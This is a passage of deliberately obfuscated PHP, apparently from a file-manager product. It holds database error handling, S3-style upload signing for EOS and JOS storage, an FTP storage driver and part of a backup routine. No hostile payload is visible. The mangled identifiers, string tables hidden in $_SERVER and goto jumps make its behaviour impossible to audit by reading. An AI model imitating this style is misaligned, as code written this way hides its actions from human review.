$_SERVER[°‰†òö¯]; $è¿ïÆ¦Ø = $this->query($©ßÕÜñ‡[45] . $©ßÕÜñ‡[46] . $©ßÕÜñ‡[47]); $ıõ¹Ùƒø = array(); foreach ($è¿ïÆ¦Ø as $İ®½üÁ… => $¾µÎŒİÉ) { $ıõ¹Ùƒø[$İ®½üÁ…] = current($¾µÎŒİÉ); } return $ıõ¹Ùƒø; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ŸØ¤‡†Œ =& $_SERVER[°‰†òö¯]; $this->error = $this->_linkID->lastErrorMsg(); if ($ŸØ¤‡†Œ[12] != $this->queryStr) { $this->error .= LNG($ŸØ¤‡†Œ[48]) . $this->queryStr; } think_trace($this->error, $ŸØ¤‡†Œ[12], $ŸØ¤‡†Œ[49]); return $this->error; } public function escapeString($ĞÔÊƒ‚¢) { $© ¸è†É =& $_SERVER[°‰†òö¯]; if ($this->_linkID) { return $this->_linkID->escapeString($ĞÔÊƒ‚¢); } return str_ireplace($© ¸è†É[58], $© ¸è†É[59], $ĞÔÊƒ‚¢); } public function parseLimit($Ïä—€Íó) { $ŠÅååù¶ =& $_SERVER[°‰†òö¯]; $ÄªÚ«Ú¢ = $ŠÅååù¶[12]; if (!empty($Ïä—€Íó)) { $Ïä—€Íó = explode($ŠÅååù¶[50], $Ïä—€Íó); if (count($Ïä—€Íó) > 1) { $ÄªÚ«Ú¢ .= $ŠÅååù¶[51] . $Ïä—€Íó[1] . $ŠÅååù¶[52] . $Ïä—€Íó[0] . $ŠÅååù¶[53]; } else { $ÄªÚ«Ú¢ .= $ŠÅååù¶[51] . $Ïä—€Íó[0] . $ŠÅååù¶[53]; } } return $ÄªÚ«Ú¢; } } goto F÷ ¥‘îàÀ; fí´ˆé†¸: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($öæÛ“Ú¹) { parent::__construct($öæÛ“Ú¹); $this->setSignVersion($_SERVER[°‰†òö¯][249]); } public function uploadFormData($¼®¶ùô, $ªŒáùûÚ = 3600) { $¨şÈ– =& $_SERVER[°‰†òö¯]; $Ì§ıöˆÅ = $¨şÈ–[231]; $Ûâá°»ú = $¨şÈ–[259]; $Û†œèÔı = $¨şÈ–[62]; $‚üºé  = gmdate($¨şÈ–[260]); $Ó÷¦¦®Ê = gmdate($¨şÈ–[261]); $°«×Òô = $¨şÈ–[262]; $ÑÔÑ‘©İ = $ªŒáùûÚ . $¨şÈ–[12]; $ß“ë×× = $¨şÈ–[263]; $«éñ±Õ = array($this->accessKey, $Ó÷¦¦®Ê, $this->region, $Û†œèÔı, $°«×Òô); $‚³–ëé¹ = implode($¨şÈ–[8], $«éñ±Õ); $Ø£Å¾¥Š = array($¨şÈ–[264] => gmdate($¨şÈ–[1411], strtotime($¨şÈ–[266])), $¨şÈ–[267] => array(array($¨şÈ–[268] => $this->bucket), array($¨şÈ–[308] => $Ì§ıöˆÅ), array($¨şÈ–[269], $¨şÈ–[270], $¨şÈ–[12]), array($¨şÈ–[269], $¨şÈ–[271], $¨şÈ–[12]), array($¨şÈ–[269], $¨şÈ–[309], $¨şÈ–[12]), array($¨şÈ–[272] => $ß“ë××), array($¨şÈ–[273] => $‚³–ëé¹), array($¨şÈ–[274] => $Ûâá°»ú), array($¨şÈ–[275] => $‚üºé ), array($¨şÈ–[276] => $ÑÔÑ‘©İ))); $Öû·™È¹ = base64_encode(json_encode($Ø£Å¾¥Š)); $™Ç¸¤æ = hash_hmac($¨şÈ–[277], $Ó÷¦¦®Ê, $¨şÈ–[278] . $this->secret, !0); $çÁˆÍä§ = hash_hmac($¨şÈ–[277], $this->region, $™Ç¸¤æ, !0); $ª¸Õ‘ü¡ = hash_hmac($¨şÈ–[277], $Û†œèÔı, $çÁˆÍä§, !0); $ÁàµÂ‘É = hash_hmac($¨şÈ–[277], $°«×Òô, $ª¸Õ‘ü¡, !0); $Å’Çè­² = hash_hmac($¨şÈ–[277], $Öû·™È¹, $ÁàµÂ‘É); $Ş‘‘âš = array($¨şÈ–[248] => $¨şÈ–[12], $¨şÈ–[296] => $¨şÈ–[12], $¨şÈ–[308] => $Ì§ıöˆÅ, $¨şÈ–[272] => $ß“ë××, $¨şÈ–[279] => $Öû·™È¹, $¨şÈ–[310] => $‚³–ëé¹, $¨şÈ–[311] => $Ûâá°»ú, $¨şÈ–[312] => $‚üºé , $¨şÈ–[313] => $ÑÔÑ‘©İ, $¨şÈ–[314] => $Å’Çè­², $¨şÈ–[208] => $this->getHost()); return $Ş‘‘âš; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($ÄãÊ Ô ) { parent::__construct(); if (count($ÄãÊ Ô ) > 0) { $this->_init($ÄãÊ Ô ); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ü€»ïé) { $™×¹ò­ç =& $_SERVER[°‰†òö¯]; global $config; $this->appCharset = $config[$™×¹ò­ç[1437]]; $this->systemCharset = $config[$™×¹ò­ç[1438]]; if (isset($ü€»ïé[$™×¹ò­ç[1439]]) && $ü€»ïé[$™×¹ò­ç[1439]]) { $this->systemCharset = $ü€»ïé[$™×¹ò­ç[1439]]; } } public function iconvApp($½Æ¶—’í) { return $this->iconvTo($½Æ¶—’í, $this->systemCharset, $this->appCharset); } public function iconvSystem($Ö¨¼»ÁÉ) { return $this->iconvTo($Ö¨¼»ÁÉ, $this->appCharset, $this->systemCharset); } public function getPathOuter($Óëæë€¡) { $²ç‡ß =& $_SERVER[°‰†òö¯]; $ô—ÆÑû = $this->iconvApp($this->pathBase); $Óëæë€¡ = $this->iconvApp($Óëæë€¡); if (substr($ô—ÆÑû, 0, 2) == $²ç‡ß[1409]) { $ô—ÆÑû = BASIC_PATH . substr($ô—ÆÑû, 2); } if (substr($Óëæë€¡, 0, 2) == $²ç‡ß[1409]) { $Óëæë€¡ = BASIC_PATH . substr($Óëæë€¡, 2); } $ô—ÆÑû = KodIO::clear($ô—ÆÑû); $Óëæë€¡ = KodIO::clear($Óëæë€¡); $Óëæë€¡ = substr($Óëæë€¡, strlen($ô—ÆÑû)); if (empty($this->pathDriver)) { return $Óëæë€¡; } return $this->pathDriver . $²ç‡ß[8] . ltrim($Óëæë€¡, $²ç‡ß[8]); } private function _init($êòØ­¤» = array()) { $£»ª¬» =& $_SERVER[°‰†òö¯]; if (!function_exists($£»ª¬»[1440])) { throw new Exception(LNG($£»ª¬»[1441])); } $this->config = $êòØ­¤»; $this->charsetReset($êòØ­¤»); foreach ($êòØ­¤» as $‘Ç¡…Ü¹ => $Æ¤½ŒÈ¯) { if (isset($this->{$‘Ç¡…Ü¹})) { $this->{$‘Ç¡…Ü¹} = $Æ¤½ŒÈ¯; } } return $this->_login($êòØ­¤»); } private function _login($‹ìØáÙµ) { $ë€úØ¿ô =& $_SERVER[°‰†òö¯]; static $·ÏÒ«˜’ = array(); $©‚ÃØİÀ = md5(json_encode($‹ìØáÙµ)); if (isset($·ÏÒ«˜’[$©‚ÃØİÀ])) { foreach ($·ÏÒ«˜’[$©‚ÃØİÀ] as $µ”Êôš¹ => $•¾Ì²œÊ) { $this->{$µ”Êôš¹} = $•¾Ì²œÊ; } return !0; } $½â–üÖ = parse_url(trim($this->server, $ë€úØ¿ô[8])); $this->host = $½â–üÖ[$ë€úØ¿ô[208]]; $úı½í’ğ = isset($½â–üÖ[$ë€úØ¿ô[207]]) && $½â–üÖ[$ë€úØ¿ô[207]] == $ë€úØ¿ô[1442] ? !0 : !1; $this->scheme = $úı½í’ğ ? $ë€úØ¿ô[1443] : $ë€úØ¿ô[1444]; $this->port = isset($½â–üÖ[$ë€úØ¿ô[209]]) ? $½â–üÖ[$ë€úØ¿ô[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ë€úØ¿ô[1445]) . $this->host . $ë€úØ¿ô[4] . $this->port, !0); return !1; } $ó³¬ƒÒ³ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ó³¬ƒÒ³) { $this->writeLog(LNG($ë€úØ¿ô[1446]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $ë€úØ¿ô[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ƒÄ‚¢åË = $this->pasv == $ë€úØ¿ô[91] ? !0 : !1; @ftp_pasv($this->connect, $ƒÄ‚¢åË); $·ÏÒ«˜’[$©‚ÃØİÀ] = array($ë€úØ¿ô[1447] => $this->connect, $ë€úØ¿ô[208] => $this->host, $ë€úØ¿ô[207] => $this->scheme, $ë€úØ¿ô[209] => $this->port); return $ó³¬ƒÒ³; } private function _isconn($Çü™Ä« = true) { if (is_resource($this->connect)) { return !0; } if (!$Çü™Ä«) { return !1; } return $this->_login($this->config); } public function mkfile($ÔüÆ×²ˆ, $“”²¶¦Ç = '', $“âé¹¢ = REPEAT_RENAME) { if ($this->setContent($ÔüÆ×²ˆ, $“”²¶¦Ç)) { return $this->getPathOuter($ÔüÆ×²ˆ); } $this->writeLog(LNG($_SERVER[°‰†òö¯][1448]), !0); return !1; } public function mkdir($ˆ÷ÙšäÎ, $Ê¼Ô¬êœ = REPEAT_SKIP) { $ıÜÚõğò =& $_SERVER[°‰†òö¯]; if (!$ˆ÷ÙšäÎ || $ˆ÷ÙšäÎ == $ıÜÚõğò[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ˆ÷ÙšäÎ = $this->iconvSystem($ˆ÷ÙšäÎ); if ($this->_isFolder($ˆ÷ÙšäÎ) || @ftp_mkdir($this->connect, $ˆ÷ÙšäÎ)) { return $this->getPathOuter($ˆ÷ÙšäÎ); } if (!$this->mkdir($this->pathFather($ˆ÷ÙšäÎ))) { return !1; } if ($ˆ÷ÙšäÎ = @ftp_mkdir($this->connect, $ˆ÷ÙšäÎ)) { return $this->getPathOuter($ˆ÷ÙšäÎ); } $¤×ËúË = __FUNCTION__ . $ıÜÚõğò[1449]; $this->writeLog($¤×ËúË, !0); return !1; } public function copyFile($ÎÁ×ç¿±, $¢Û•Çû£) { if (!$this->_isconn()) { return !1; } $µ¡‘‘¯ = $this->pathThis($this->iconvSystem($ÎÁ×ç¿±)); $’úŸÒ¿ = $this->tempFile($µ¡‘‘¯); $ùÑâ¤Ï¨ = $this->iconvApp($’úŸÒ¿); $this->download($ÎÁ×ç¿±, $ùÑâ¤Ï¨); $ÂøÛè¶É = $this->upload($¢Û•Çû£, $ùÑâ¤Ï¨); $this->tempFileRemve($’úŸÒ¿); return $ÂøÛè¶É; } public function moveFile($½ÌêÒĞ, $çÁ±Á´Û) { if (!$this->_isconn()) { return !1; } $½ÌêÒĞ = $this->iconvSystem($½ÌêÒĞ); $çÁ±Á´Û = $this->iconvSystem($çÁ±Á´Û); $Æº¿€ˆ = @ftp_rename($this->connect, $½ÌêÒĞ, $çÁ±Á´Û); if (!$Æº¿€ˆ) { $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][1449], !0); return !1; } return $this->getPathOuter($çÁ±Á´Û); } public function delFile($ÈÀêëÀ) { if (!$this->_isconn()) { return !1; } $ÈÀêëÀ = $this->iconvSystem($ÈÀêëÀ); $Í½¾”âª = @ftp_delete($this->connect, $ÈÀêëÀ); if (!$Í½¾”âª) { $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][1449], !0); } return $Í½¾”âª; } public function delFolder($ÎÎ² ú) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $•É‰²—Ï = $¬¼³†Ïû = array(); $this->fileList($ÎÎ² ú, $•É‰²—Ï, $¬¼³†Ïû, !0); $this->listItemCache = !0; foreach ($¬¼³†Ïû as $Ğ¾Ï¶ˆÍ) { $şœ¸Ü¥¬ = $this->iconvSystem($Ğ¾Ï¶ˆÍ[$_SERVER[°‰†òö¯][32]]); $å¢¬Ğü– = @ftp_delete($this->connect, $şœ¸Ü¥¬); if (!$å¢¬Ğü–) { return !1; } } foreach ($•É‰²—Ï as $şœ¸Ü¥¬) { $şœ¸Ü¥¬ = $this->iconvSystem($şœ¸Ü¥¬); $å¢¬Ğü– = @ftp_rmdir($this->connect, $şœ¸Ü¥¬); if (!$å¢¬Ğü–) { return !1; } } $ÎÎ² ú = $this->iconvSystem($ÎÎ² ú); return @ftp_rmdir($this->connect, $ÎÎ² ú); } public function rename($àâù´ñ, $Óğ’İ¦) { $û¿í¾Ö‰ =& $_SERVER[°‰†òö¯]; if (!$this->_isconn()) { return !1; } $¯Ü–¨Ÿ = $this->fileNameAuto($this->pathFather($àâù´ñ), $Óğ’İ¦); $¯Ü–¨Ÿ = $this->iconvSystem($¯Ü–¨Ÿ); $àâù´ñ = $this->iconvSystem($àâù´ñ); $‡Ó—¬ëŠ = $this->pathFather($àâù´ñ); $Ú“¼Êôğ = rtrim($‡Ó—¬ëŠ, $û¿í¾Ö‰[8]) . $û¿í¾Ö‰[8] . $¯Ü–¨Ÿ; $¡¨ÀáÂÜ = @ftp_rename($this->connect, $àâù´ñ, $Ú“¼Êôğ); if (!$¡¨ÀáÂÜ) { $this->writeLog(__FUNCTION__ . $û¿í¾Ö‰[1449], !0); return !1; } $Ú“¼Êôğ = $this->iconvApp($Ú“¼Êôğ); return $this->getPathOuter($Ú“¼Êôğ); } private function folderInfo($£ö«õ€Ô, $µşÌÁÈ = false) { $Ë’â§ò¼ =& $_SERVER[°‰†òö¯]; $š˜àÆ¦Ä = array($Ë’â§ò¼[32] => $this->pathThis($£ö«õ€Ô), $Ë’â§ò¼[87] => $this->getPathOuter($Ë’â§ò¼[8] . $£ö«õ€Ô), $Ë’â§ò¼[33] => $Ë’â§ò¼[78]); if ($µşÌÁÈ) { return $š˜àÆ¦Ä; } $š˜àÆ¦Ä[$Ë’â§ò¼[233]] = $š˜àÆ¦Ä[$Ë’â§ò¼[88]] = 0; $š˜àÆ¦Ä[$Ë’â§ò¼[234]] = $š˜àÆ¦Ä[$Ë’â§ò¼[235]] = !0; return $š˜àÆ¦Ä; } private function fileInfo($úÙÏ¨´å, $ïûË“½ä = false, $ë£Îë¼ = array()) { $•¥”ş²¾ =& $_SERVER[°‰†òö¯]; $—¥  •— = array($•¥”ş²¾[32] => $this->pathThis($úÙÏ¨´å), $•¥”ş²¾[87] => $this->getPathOuter($•¥”ş²¾[8] . $úÙÏ¨´å), $•¥”ş²¾[33] => $•¥”ş²¾[232], $•¥”ş²¾[79] => isset($ë£Îë¼[$•¥”ş²¾[79]]) ? $ë£Îë¼[$•¥”ş²¾[79]] : 0, $•¥”ş²¾[169] => $this->ext($úÙÏ¨´å)); if ($ïûË“½ä) { return $—¥  •—; } $—¥  •—[$•¥”ş²¾[233]] = $—¥  •—[$•¥”ş²¾[88]] = 0; $—¥  •—[$•¥”ş²¾[234]] = $—¥  •—[$•¥”ş²¾[235]] = !0; $ŸŸ†¦Ò = $this->iconvSystem($úÙÏ¨´å); $—¥  •—[$•¥”ş²¾[88]] = @ftp_mdtm($this->connect, $ŸŸ†¦Ò); if (empty($ë£Îë¼)) { $ë£Îë¼ = $this->objectMeta($úÙÏ¨´å); if (!$ë£Îë¼) { return $—¥  •—; } } $—¥  •—[$•¥”ş²¾[79]] = $ë£Îë¼[$•¥”ş²¾[79]]; return $—¥  •—; } public function size($¿ÏÙõå) { $•Ùú‰Î = $this->objectMeta($¿ÏÙõå); return $•Ùú‰Î ? $•Ùú‰Î[$_SERVER[°‰†òö¯][79]] : 0; } public function info($À•µÌ¡) { if ($this->isFile($À•µÌ¡)) { return $this->fileInfo($À•µÌ¡, 0); } else { if ($this->isFolder($À•µÌ¡)) { return $this->folderInfo($À•µÌ¡); } } return !1; } private function fileList($¸×”×üğ, &$ğÂÀ°“Ï, &$ÙÖ‘ŒÉ, $œ˜ÍŞÎµ = false) { $ŒÂèÈæÄ =& $_SERVER[°‰†òö¯]; $¸×”×üğ = $this->iconvSystem($¸×”×üğ); if (!$this->isFolder($¸×”×üğ)) { return !1; } $¸×”×üğ = rtrim($¸×”×üğ, $ŒÂèÈæÄ[8]) . $ŒÂèÈæÄ[8]; check_abort(); $ïö´¬²ê = @ftp_rawlist($this->connect, $¸×”×üğ); if (!$ïö´¬²ê) { $ïö´¬²ê = array(); } $Ó¬üöõ¶ = array($ŒÂèÈæÄ[10] => 1, $ŒÂèÈæÄ[1361] => 1); foreach ($ïö´¬²ê as $Öß÷êä®) { $ÜÎµ‰ãŒ = $this->_listItem($Öß÷êä®); if ($ÜÎµ‰ãŒ[0] == $ŒÂèÈæÄ[819]) { continue; } $¾Ñ”à¦² = $ÜÎµ‰ãŒ[8]; if (empty($¾Ñ”à¦²) && $¾Ñ”à¦² !== $ŒÂèÈæÄ[230] || isset($Ó¬üöõ¶[$¾Ñ”à¦²])) { continue; } $¾Ñ”à¦² = $this->iconvApp($¸×”×üğ . ltrim($¾Ñ”à¦², $ŒÂèÈæÄ[8])); $‚Á©Ùµ¥ = array($ŒÂèÈæÄ[32] => $¾Ñ”à¦², $ŒÂèÈæÄ[33] => $ŒÂèÈæÄ[232], $ŒÂèÈæÄ[79] => $ÜÎµ‰ãŒ[4]); if (substr($Öß÷êä®, 0, 1) == $ŒÂèÈæÄ[1450]) { $‚Á©Ùµ¥[$ŒÂèÈæÄ[33]] = $ŒÂèÈæÄ[78]; $‚Á©Ùµ¥[$ŒÂèÈæÄ[79]] = 0; } $¼ê½É‡™ = $‚Á©Ùµ¥[$ŒÂèÈæÄ[33]] == $ŒÂèÈæÄ[78] ? !0 : !1; $this->cacheMethodInfoSet($¾Ñ”à¦², $¼ê½É‡™, $‚Á©Ùµ¥); if ($¼ê½É‡™) { $ğÂÀ°“Ï[] = $¾Ñ”à¦²; if ($œ˜ÍŞÎµ) { $this->fileList($¾Ñ”à¦², $ğÂÀ°“Ï, $ÙÖ‘ŒÉ, $œ˜ÍŞÎµ); } continue; } $ÙÖ‘ŒÉ[] = $‚Á©Ùµ¥; } $this->cacheMethodInfoSet($¸×”×üğ, !0); } private function _listItem($ş“ŸèŠ¸) { if (empty($ş“ŸèŠ¸)) { return array(); } $´Â÷Ò  = preg_split($_SERVER[°‰†òö¯][1451], $ş“ŸèŠ¸); if (count($´Â÷Ò ) <= 9) { return $´Â÷Ò ; } $´Â÷Ò [8] = trim(substr($ş“ŸèŠ¸, strpos($ş“ŸèŠ¸, $´Â÷Ò [7]) + strlen($´Â÷Ò [7]))); return array_splice($´Â÷Ò , 0, 9); } public function listPath($œÑåÓ½í, $¹ÄŸá´ğ = false) { $ƒ€Øœïì =& $_SERVER[°‰†òö¯]; if (!$this->_isconn()) { return !1; } $‹‰×•çË = $¹à˜ö˜Ê = array(); $this->fileList($œÑåÓ½í, $‹‰×•çË, $¹à˜ö˜Ê); foreach ($‹‰×•çË as $Á…û…© => $‡”´øáÄ) { $‹‰×•çË[$Á…û…©] = $this->folderInfo($‡”´øáÄ, $¹ÄŸá´ğ); } foreach ($¹à˜ö˜Ê as $Á…û…© => $‡”´øáÄ) { $¹à˜ö˜Ê[$Á…û…©] = $this->fileInfo($‡”´øáÄ[$ƒ€Øœïì[32]], $¹ÄŸá´ğ, $‡”´øáÄ); } return array($ƒ€Øœïì[85] => $‹‰×•çË, $ƒ€Øœïì[86] => $¹à˜ö˜Ê); } public function has($‘ìïÅõÊ, $ğ™”ç÷ = false, $ÀŞ™Ò†Á = true) { $¬è¨¸—† =& $_SERVER[°‰†òö¯]; $İº¥ó™ = $½öÍä•ã = array(); $·ÇÙ¸¢® = $ğ™”ç÷ ? !0 : !1; $this->fileList($‘ìïÅõÊ, $İº¥ó™, $½öÍä•ã, $·ÇÙ¸¢®); if ($ğ™”ç÷) { return array($¬è¨¸—†[241] => count($½öÍä•ã), $¬è¨¸—†[242] => count($İº¥ó™)); } if ($ÀŞ™Ò†Á) { if (count($½öÍä•ã)) { return !0; } } else { if (count($İº¥ó™)) { return !0; } } return !1; } public function listAll($‰«¿³¹Æ) { $ù¶åÁ‰Ï =& $_SERVER[°‰†òö¯]; if (!$this->_isconn()) { return !1; } $‹é„İ©Õ = $¢…‚Ëçˆ = array(); $this->fileList($‰«¿³¹Æ, $‹é„İ©Õ, $¢…‚Ëçˆ, !0); $¦«¸Å©Ô = array_to_keyvalue($¢…‚Ëçˆ, $ù¶åÁ‰Ï[32]); foreach ($‹é„İ©Õ as $®Ùº Ü´) { if (is_string($®Ùº Ü´)) { $¦«¸Å©Ô[$®Ùº Ü´] = array($ù¶åÁ‰Ï[79] => 0); } } return $this->listAllFiles($‰«¿³¹Æ, $¦«¸Å©Ô); } public function getContent($ìŞ½€‰„) { if (!$this->_isconn()) { return !1; } $ìŞ½€‰„ = $this->iconvSystem($ìŞ½€‰„); return $this->fileSubstr($ìŞ½€‰„); } public function setContent($ñÃçîÓ¨, $ëíùíòÉ = '') { if (!$this->_isconn()) { return !1; } $äÍÖ´Å = $this->pathThis($this->iconvSystem($ñÃçîÓ¨)); $ûÚìÂëŒ = $this->tempFile($äÍÖ´Å); file_put_contents($ûÚìÂëŒ, $ëíùíòÉ); $Ã¬¶ƒè© = $this->upload($ñÃçîÓ¨, $this->iconvApp($ûÚìÂëŒ)); $this->tempFileRemve($ûÚìÂëŒ); return $Ã¬¶ƒè©; } public function fileSubstr($¹Øòõ’Ë, $“ñòöËí = 0, $üÓº•æ³ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¹Øòõ’Ë, $“ñòöËí, $üÓº•æ³); } private function ftpRequest($ğˆ“¼ƒ—, $‘˜›şÚ» = 0, $ŸÑåêÕ° = false) { $şÏÍÈó± =& $_SERVER[°‰†òö¯]; $ğˆ“¼ƒ— = $şÏÍÈó±[8] . ltrim(str_ltrim($ğˆ“¼ƒ—, $this->ftpPath), $şÏÍÈó±[8]); $ğˆ“¼ƒ— = $this->iconvSystem($ğˆ“¼ƒ—); $ëŞÊ½˜¥ = $this->scheme . $this->host . $şÏÍÈó±[4] . $this->port; $Ç½ä­ş® = curl_init(); curl_setopt($Ç½ä­ş®, CURLOPT_URL, $ëŞÊ½˜¥ . $this->pathEncode($ğˆ“¼ƒ—)); curl_setopt($Ç½ä­ş®, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ŸÑåêÕ°) { $£Ìøú“ = $‘˜›şÚ» + $ŸÑåêÕ° - 1; curl_setopt($Ç½ä­ş®, CURLOPT_RANGE, "{$‘˜›şÚ»}\55{$£Ìøú“}"); } curl_setopt($Ç½ä­ş®, CURLOPT_RETURNTRANSFER, 1); $âö” Ì® = curl_exec($Ç½ä­ş®); curl_close($Ç½ä­ş®); return $âö” Ì®; } public function upload($‘¸èÚñí, $Òù—ğßú, $ÖæàÃœø = false, $éˆ˜×šı = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($‘¸èÚñí))) { return !1; } $‘¸èÚñí = $this->iconvSystem($‘¸èÚñí); $Òù—ğßú = $this->iconvSystem($Òù—ğßú); $Œ‰õà¾ = ftp_nb_put($this->connect, $‘¸èÚñí, $Òù—ğßú, FTP_BINARY); while ($Œ‰õà¾ == FTP_MOREDATA) { $Œ‰õà¾ = ftp_nb_continue($this->connect); } if ($Œ‰õà¾ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][1449], !0); return !1; } return $this->getPathOuter($‘¸èÚñí); } public function download($ºŞÅÉÄÂ, $Öœ³•œ = '') { if (!$this->_isconn()) { return !1; } $ŒÀßãõé = $this->pathFather($Öœ³•œ); if (!IO::mkdir($ŒÀßãõé)) { return !1; } $ºŞÅÉÄÂ = $this->iconvSystem($ºŞÅÉÄÂ); $Öœ³•œ = $this->iconvSystem($Öœ³•œ); $«¸Åõ¦Ö = ftp_nb_get($this->connect, $Öœ³•œ, $ºŞÅÉÄÂ, FTP_BINARY); while ($«¸Åõ¦Ö == FTP_MOREDATA) { $«¸Åõ¦Ö = ftp_nb_continue($this->connect); } if ($«¸Åõ¦Ö != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[°‰†òö¯][1449], !0); return !1; } return $this->iconvApp($Öœ³•œ); } public function exist($³Ù±¦Ü±) { return $this->isFile($³Ù±¦Ü±) || $this->isFolder($³Ù±¦Ü±); } public function isFile($úŠÖÓ‘¼) { return !$this->isFolder($úŠÖÓ‘¼) && $this->objectMeta($úŠÖÓ‘¼); } public function isFolder($àüÁÇüä) { return $this->cacheMethod($_SERVER[°‰†òö¯][179], $àüÁÇüä); } protected function objectMeta($…®®ùû) { return $this->cacheMethod($_SERVER[°‰†òö¯][181], $…®®ùû); } protected function _objectMeta($Õ©ÄÎ¥’) { $¤Ö¦Ì‰Á =& $_SERVER[°‰†òö¯]; if ($Õ©ÄÎ¥’ == $¤Ö¦Ì‰Á[12] || $Õ©ÄÎ¥’ == $¤Ö¦Ì‰Á[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Õ©ÄÎ¥’ = $this->iconvSystem($Õ©ÄÎ¥’); $º†„¨¦ï = array($¤Ö¦Ì‰Á[32] => $this->iconvApp($Õ©ÄÎ¥’), $¤Ö¦Ì‰Á[33] => $¤Ö¦Ì‰Á[232], $¤Ö¦Ì‰Á[79] => 0); $‚—½à–ó = @ftp_size($this->connect, $Õ©ÄÎ¥’); if ($‚—½à–ó != -1) { $º†„¨¦ï[$¤Ö¦Ì‰Á[79]] = $‚—½à–ó; } else { $œ±•îïó = @ftp_chdir($this->connect, $Õ©ÄÎ¥’); if (!$œ±•îïó) { return !1; } @ftp_chdir($this->connect, $¤Ö¦Ì‰Á[8]); $º†„¨¦ï[$¤Ö¦Ì‰Á[33]] = $¤Ö¦Ì‰Á[78]; } return $º†„¨¦ï; } protected function _isFolder($Óí²÷™‚) { $“Ô¼²ê =& $_SERVER[°‰†òö¯]; if ($Óí²÷™‚ == $“Ô¼²ê[12] || $Óí²÷™‚ == $“Ô¼²ê[8]) { return !0; } $ÉàÀ¤™ = $this->_objectMeta($Óí²÷™‚); return isset($ÉàÀ¤™[$“Ô¼²ê[33]]) && $ÉàÀ¤™[$“Ô¼²ê[33]] == $“Ô¼²ê[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($˜˜“ŞÎ¿) { parent::__construct($˜˜“ŞÎ¿); $this->setSignVersion($_SERVER[°‰†òö¯][249]); } public function uploadLink($İæ ¸ú„, $›ƒ²ãˆã = 0) { $·¹ƒ“ô =& $_SERVER[°‰†òö¯]; if ($this->isUploadServer()) { return; } $ÌşäÂ’Ë = $this->getType(); if (!in_array($ÌşäÂ’Ë, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $éÇ²§Ñ = (!$›ƒ²ãˆã ? 1 : ceil($›ƒ²ãˆã / pow(1024, 3))) * 3600 * 4; $õ‡Ù‰® = $this->uploadMultiData($İæ ¸ú„, $éÇ²§Ñ); if ($õ‡Ù‰®) { $õ‡Ù‰®[$·¹ƒ“ô[97]] = $İæ ¸ú„; $õ‡Ù‰®[$·¹ƒ“ô[98]] = $ÌşäÂ’Ë; } return $õ‡Ù‰®; } public function fileOutImage($ÄáÒ£ô¾, $²çôè = 250) { if ($this->size($ÄáÒ£ô¾) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ÄáÒ£ô¾, $²çôè); } $œºÎ²Ãà = $this->link($ÄáÒ£ô¾); $œºÎ²Ãà .= $_SERVER[°‰†òö¯][1452] . $²çôè; $this->fileOutLink($œºÎ²Ãà); } public function fileOutLink($†ÜÍÒ»‘) { $Ëùğ´¤ =& $_SERVER[°‰†òö¯]; if (substr($†ÜÍÒ»‘, 0, 7) == $Ëùğ´¤[218]) { $†ÜÍÒ»‘ = $Ëùğ´¤[219] . substr($†ÜÍÒ»‘, 7); } header($Ëùğ´¤[175] . $†ÜÍÒ»‘); die; } } goto B•¦‚ÂÇ‡³; DáØ¨í•È…: class BackupDbFile { public function __construct() { } public function index() { $á„×Ë =& $_SERVER[°‰†òö¯]; $¡Åì¿®ê = Backup::get(); $…‰¨²æ = $¡Åì¿®ê[$á„×Ë[32]]; $ª×ë¶…  = $this->tmpFilesPath() . "\x62\x61\x63\153\165\160\x5f{$…‰¨²æ}\57"; $Öëîà§š = $this->backupPath($¡Åì¿®ê); if (!($Öëîà§š = IO::mkdir($Öëîà§š))) { Backup::log($á„×Ë[861] . $Öëîà§š); return !1; } $¿§ÕÏÀù = IO::listPath($ª×ë¶… ); $æò…ê©û = isset($¿§ÕÏÀù[$á„×Ë[86]]) ? $¿§ÕÏÀù[$á„×Ë[86]] : array(); $úñ‘‘·œ = array_sum(array_column($æò…ê©û, $á„×Ë[79])); if (!$úñ‘‘·œ) { Backup::log($á„×Ë[862] . $ª×ë¶… ); return !1; } $ÇÛ†ÛÕó = array($á„×Ë[863] => $úñ‘‘·œ, $á„×Ë[864] => time()); Backup::set($ÇÛ†ÛÕó); $Ó¦¤÷óà = new TaskFileTransfer($á„×Ë[865], $á„×Ë[838], count($æò…ê©û), LNG($á„×Ë[847]) . $á„×Ë[464] . LNG($á„×Ë[849]) . $á„×Ë[866]); $Ó¦¤÷óà->task[$á„×Ë[824]] = $úñ‘‘·œ; foreach ($¿§ÕÏÀù[$á„×Ë[86]] as $ğàÑ¨³ğ) { $Šèî„ = IO::move($ğàÑ¨³ğ[$á„×Ë[87]], $Öëîà§š); if (!$Šèî„) { $Ó¦¤÷óà->end(); $Ü™¡ÇÛ = IO::getLastError($á„×Ë[867] . $ğàÑ¨³ğ[$á„×Ë[87]] . $á„×Ë[868] . $Öëîà§š . $á„×Ë[178]); Backup::log($Ü™¡ÇÛ); return !1; } } 